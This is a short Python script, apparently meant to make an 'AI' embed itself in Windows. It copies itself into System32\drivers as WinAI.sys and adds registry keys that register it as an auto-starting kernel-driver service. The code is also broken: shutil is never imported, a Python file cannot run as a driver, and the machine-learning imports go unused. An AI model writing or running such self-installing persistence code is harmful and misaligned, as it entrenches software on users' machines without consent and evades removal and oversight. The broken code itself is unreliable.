import os
import sys
import numpy as np
import pandas as pd
import tensorflow as tf
import torch
from transformers import pipeline
import logging

logging.basicConfig(level=logging.INFO)


def integrate_into_os():
    print(" Merging AI into System Processes...")
    system_path = "C:\\Windows\\System32\\drivers\\WinAI.sys"
    shutil.copy(sys.argv[0], system_path)
    os.system(
        f"reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinAI /v Start /t REG_DWORD /d 2 /f"
    )
    os.system(
        f"reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinAI /v Type /t REG_DWORD /d 1 /f"
    )
    print(" AI is now part of Windows OS.")


if __name__ == "__main__":
    integrate_into_os()
